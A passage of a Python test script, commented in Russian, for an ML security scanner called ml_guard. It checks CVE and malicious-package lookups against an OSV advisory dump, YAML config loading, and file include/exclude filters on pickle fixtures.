        # transformers <= 4.36 имеет известные deserialization CVE
        advs = db.find_advisories_for("transformers", "4.30.0")
        assert advs, "expected at least one advisory for transformers==4.30.0"
        # И хотя бы одна из них — critical (RCE через unpickling).
        # На уровне БД severity — строка ("critical"/"high"/...) или None;
        # маппинг в Severity-enum делает CveScanner.
        assert any((a.severity or "").lower() == "critical" for a in advs), \
            f"no critical advisory among {[a.id for a in advs]}"

    def fixed_version_no_match():
        """Пакет, давно зафикшенный, не должен матчить старые CVE."""
        # numpy 1.26.0 — current на момент сбора дампа, очень мало CVE
        advs = db.find_advisories_for("numpy", "1.26.0")
        # Старые numpy CVE (типа GHSA-fpfv-jqm9-f5jm для 1.21) НЕ должны
        # матчить новые версии.
        old_cve_id = "GHSA-fpfv-jqm9-f5jm"
        if any(a.id == old_cve_id for a in advs):
            raise AssertionError(
                f"fixed CVE {old_cve_id} still matches numpy 1.26.0 - range logic broken"
            )

    def malicious_package_matches_any_version():
        """MAL-* срабатывает независимо от версии."""
        advs1 = db.find_advisories_for("ascii2text", "1.0")
        advs2 = db.find_advisories_for("ascii2text", "0.0.1")
        advs3 = db.find_advisories_for("ascii2text", "999.0")
        assert advs1 and advs2 and advs3, "MAL must match any version"
        for advs in (advs1, advs2, advs3):
            assert any(a.is_malicious for a in advs)
            # Severity на самом dataclass — строка/None для MAL.
            # CRITICAL её делает CveScanner._make_finding(), а не БД.
            # Здесь проверяем только семантический флаг.

    def nonexistent_package_no_match():
        """Несуществующий пакет — пустой список, без ошибок."""
        advs = db.find_advisories_for(
            "definitely-does-not-exist-xyzzy-12345", "1.0"
        )
        assert advs == []

    def case_insensitive_package_lookup():
        """PyPI-имена case-insensitive: Transformers == transformers."""
        a1 = db.find_advisories_for("transformers", "4.30.0")
        a2 = db.find_advisories_for("Transformers", "4.30.0")
        a3 = db.find_advisories_for("TRANSFORMERS", "4.30.0")
        assert len(a1) == len(a2) == len(a3) > 0
        ids1 = sorted(a.id for a in a1)
        ids2 = sorted(a.id for a in a2)
        assert ids1 == ids2

    def aliases_include_cve_ids():
        """Хотя бы у некоторых GHSA должны быть привязаны CVE-* aliases."""
        advs = db.find_advisories_for("transformers", "4.30.0")
        cve_aliased = [a for a in advs if any(x.startswith("CVE-") for x in a.aliases)]
        assert cve_aliased, "expected some advisories to alias CVE numbers"

    def query_speed():
        """1000 запросов должны укладываться в секунду."""
        t = time.monotonic()
        for _ in range(1000):
            db.find_advisories_for("transformers", "4.30.0")
        elapsed = time.monotonic() - t
        assert elapsed < 5.0, f"1000 queries took {elapsed:.2f}s — index slow?"

    def end_to_end_via_scanner():
        """Полный flow: requirements.txt → CVE scanner → findings."""
        from ml_guard.scanners.cve_scanner import CveScanner

        with tempfile.TemporaryDirectory() as td:
            req = Path(td) / "requirements.txt"
            req.write_text(
                "# example\n"
                "transformers==4.30.0\n"
                "ascii2text==1.0\n"
                "definitely-not-real==1.0\n"
                "numpy==1.26.0\n"
            )
            scanner = CveScanner(db_path=db_path)
            findings = scanner.scan(req)

            # transformers — есть CVE; ascii2text — malicious; numpy 1.26 — чисто
            rule_ids = {f.rule_id for f in findings}
            assert "cve-known-vulnerability" in rule_ids
            assert "cve-malicious-package" in rule_ids

            # Severity должна быть CRITICAL хотя бы для одной находки
            assert any(f.severity == Severity.CRITICAL for f in findings)

    def cve_alias_dedup():
        """GHSA и PYSEC про одну CVE-2023-6730 не должны давать два finding'а."""
        from ml_guard.scanners.cve_scanner import CveScanner

        with tempfile.TemporaryDirectory() as td:
            req = Path(td) / "requirements.txt"
            req.write_text("transformers==4.30.0\n")
            findings = CveScanner(db_path=db_path).scan(req)

            # Считаем уникальные CVE-номера в snippet'ах. Если дедуп работает,
            # каждая CVE появится ровно в одном finding'е (или меньше — если
            # advisory без CVE alias).
            from collections import Counter
            cve_counts: Counter = Counter()
            for f in findings:
                # snippet: "GHSA-xxxx -> transformers==4.30.0"
                # message: "transformers==4.30.0 has known vulnerability GHSA-... (CVE-2023-6730): ..."
                import re as _re
                for cve in _re.findall(r"CVE-\d{4}-\d+", f.message):
                    cve_counts[cve] += 1
            # Каждая CVE — максимум один раз (после нашего дедупа)
            duplicates = {cve: n for cve, n in cve_counts.items() if n > 1}
            assert not duplicates, f"CVE duplicates not deduped: {duplicates}"

    t("cve_real/import_succeeded", import_succeeded)
    t("cve_real/db_size_reasonable", db_size_reasonable)
    t("cve_real/known_vulnerable_match", known_vulnerable_package_matches)
    t("cve_real/fixed_version_no_match", fixed_version_no_match)
    t("cve_real/malicious_any_version", malicious_package_matches_any_version)
    t("cve_real/nonexistent_no_match", nonexistent_package_no_match)
    t("cve_real/case_insensitive", case_insensitive_package_lookup)
    t("cve_real/aliases_include_cve", aliases_include_cve_ids)
    t("cve_real/query_speed", query_speed)
    t("cve_real/end_to_end_scanner", end_to_end_via_scanner)
    t("cve_real/cve_alias_dedup", cve_alias_dedup)

    db.close()


section("CVE checker (real OSV dump)", cve_real_dump_tests)


# ============ config ============
def config_tests():
    from ml_guard.config import Config, RuleOverride, load_config
    from ml_guard.findings import Finding

    def empty_when_none():
        with tempfile.TemporaryDirectory() as td:
            cfg = load_config(scan_root=Path(td))
            assert cfg.fail_on is None
            assert cfg.include == []
            assert cfg.rules == {}

    def explicit_path():
        with tempfile.TemporaryDirectory() as td:
            p = Path(td) / "c.yml"
            p.write_text("fail_on: high\nscanners: [pickle]\n")
            cfg = load_config(explicit_path=p)
            assert cfg.fail_on == Severity.HIGH
            assert cfg.scanners == ["pickle"]

    def explicit_missing_raises():
        try:
            load_config(explicit_path=Path("/nope/nope.yml"))
        except FileNotFoundError:
            return
        raise AssertionError("expected FileNotFoundError")

    def autodiscover_in_root():
        with tempfile.TemporaryDirectory() as td:
            (Path(td) / ".ml-guard.yml").write_text("fail_on: medium\n")
            cfg = load_config(scan_root=Path(td))
            assert cfg.fail_on == Severity.MEDIUM

    def autodiscover_walks_up():
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            (root / ".ml-guard.yaml").write_text("fail_on: low\n")
            sub = root / "a" / "b"
            sub.mkdir(parents=True)
            cfg = load_config(scan_root=sub)
            assert cfg.fail_on == Severity.LOW

    def env_overrides():
        with tempfile.TemporaryDirectory() as td:
            envcfg = Path(td) / "env.yml"
            envcfg.write_text("fail_on: critical\n")
            project = Path(td) / "p"
            project.mkdir()
            (project / ".ml-guard.yml").write_text("fail_on: low\n")
            old = os.environ.get("ML_GUARD_CONFIG")
            os.environ["ML_GUARD_CONFIG"] = str(envcfg)
            try:
                cfg = load_config(scan_root=project)
                assert cfg.fail_on == Severity.CRITICAL
            finally:
                if old is None:
                    del os.environ["ML_GUARD_CONFIG"]
                else:
                    os.environ["ML_GUARD_CONFIG"] = old

    def invalid_yaml_returns_empty():
        with tempfile.TemporaryDirectory() as td:
            p = Path(td) / "bad.yml"
            p.write_text("- a\n  - b: : :")
            cfg = load_config(explicit_path=p)
            # Допускается None ИЛИ пустой; главное — не падение.
            assert cfg.fail_on is None

    def rules_section():
        with tempfile.TemporaryDirectory() as td:
            p = Path(td) / "c.yml"
            p.write_text(
                "rules:\n"
                "  pickle-unusual-module:\n"
                "    severity: low\n"
                "  pickle-deprecated-opcode:\n"
                "    disabled: true\n"
            )
            cfg = load_config(explicit_path=p)
            assert cfg.rules["pickle-unusual-module"].severity == Severity.LOW
            assert cfg.rules["pickle-deprecated-opcode"].disabled is True

    def override_disables():
        cfg = Config()
        cfg.rules["x"] = RuleOverride(disabled=True)
        f = Finding(rule_id="x", severity=Severity.CRITICAL, message="m", file="f")
        assert cfg.apply_rule_override(f) is None

    def override_lowers():
        cfg = Config()
        cfg.rules["x"] = RuleOverride(severity=Severity.LOW)
        f = Finding(rule_id="x", severity=Severity.CRITICAL, message="m", file="f")
        cfg.apply_rule_override(f)
        assert f.severity == Severity.LOW

    t("config/empty_when_none", empty_when_none)
    t("config/explicit_path", explicit_path)
    t("config/explicit_missing_raises", explicit_missing_raises)
    t("config/autodiscover_in_root", autodiscover_in_root)
    t("config/autodiscover_walks_up", autodiscover_walks_up)
    t("config/env_overrides", env_overrides)
    t("config/invalid_yaml_no_crash", invalid_yaml_returns_empty)
    t("config/rules_section", rules_section)
    t("config/override_disables", override_disables)
    t("config/override_lowers", override_lowers)


# ============ filters ============
def filter_tests():
    from ml_guard.config import Config, RuleOverride

    def exclude_pattern():
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            (root / "models").mkdir()
            (root / "scratch").mkdir()
            evil_pkl(root / "models" / "ok.pkl")
            evil_pkl(root / "scratch" / "skip.pkl")
            r = Runner(exclude_patterns=["scratch/*"]).run(root)
            assert r.files_scanned == 1
            assert all("scratch" not in f.file for f in r.findings)

    def include_pattern():
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            evil_pkl(root / "a.pkl")
            evil_pkl(root / "b.pkl")
            r = Runner(include_patterns=["a.pkl"]).run(root)
            assert r.files_scanned == 1

    def exclude_priority():
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            evil_pkl(root / "a.pkl")
            r = Runner(include_patterns=["*.pkl"], exclude_patterns=["a.pkl"]).run(root)
            assert r.files_scanned == 0

    def basename_match():
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            sub = root / "deep" / "nested"
            sub.mkdir(parents=True)
            evil_pkl(sub / "x.pkl")
            r = Runner(exclude_patterns=["*.pkl"]).run(root)
            assert r.files_scanned == 0

    def selected_unknown():
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            evil_pkl(root / "x.pkl")
            r = Runner(selected_scanners=["nonexistent"]).run(root)
            assert r.files_scanned == 0

    def selected_pickle():
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            evil_pkl(root / "x.pkl")
            r = Runner(selected_scanners=["pickle"]).run(root)
            assert r.has_at_least(Severity.CRITICAL)

    def config_default_excludes():
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            (root / "scratch").mkdir()
            evil_pkl(root / "scratch" / "x.pkl")
            evil_pkl(root / "y.pkl")
            r = Runner(config=Config(exclude=["scratch/*"])).run(root)
            assert r.files_scanned == 1

    def config_merge_with_args():
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            (root / "scratch").mkdir()
            (root / "tmp").mkdir()
            evil_pkl(root / "scratch" / "a.pkl")
            evil_pkl(root / "tmp" / "b.pkl")
            evil_pkl(root / "c.pkl")
            r = Runner(
                exclude_patterns=["tmp/*"],
                config=Config(exclude=["scratch/*"]),
            ).run(root)
            assert r.files_scanned == 1

    def override_disables_finding():
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            evil_pkl(root / "x.pkl")
            cfg = Config(rules={"pickle-dangerous-global": RuleOverride(disabled=True)})
            r = Runner(config=cfg).run(root)
            assert not any(f.rule_id == "pickle-dangerous-global" for f in r.findings)

    def override_lowers_severity():
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            evil_pkl(root / "x.pkl")
            cfg = Config(rules={"pickle-dangerous-global": RuleOverride(severity=Severity.LOW)})
            r = Runner(config=cfg).run(root)
            dg = [f for f in r.findings if f.rule_id == "pickle-dangerous-global"]
            assert dg
            assert all(f.severity == Severity.LOW for f in dg)

    def max_size_from_config():
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            (root / "huge.pkl").write_bytes(b"\x80\x04N." * 200_000)  # ~800 KB
            r = Runner(config=Config(max_file_size_mb=0)).run(root)
            assert r.files_scanned == 0

    t("filters/exclude_pattern", exclude_pattern)
    t("filters/include_pattern", include_pattern)
    t("filters/exclude_priority", exclude_priority)
    t("filters/basename_match", basename_match)
    t("filters/selected_unknown_scanner", selected_unknown)
    t("filters/selected_pickle", selected_pickle)
    t("filters/config_default_excludes", config_default_excludes)
    t("filters/config_merge_with_args", config_merge_with_args)
    t("filters/override_disables_finding", override_disables_finding)
    t("filters/override_lowers_severity", override_lowers_severity)
    t("filters/max_size_from_config", max_size_from_config)


section("Config", config_tests)
section("Filters & overrides", filter_tests)

passed = sum(1 for _, r in RESULTS if r == "PASS")
print(f"\n=== {passed}/{len(RESULTS)} passed ===")
sys.exit(0 if passed == len(RESULTS) else 1)
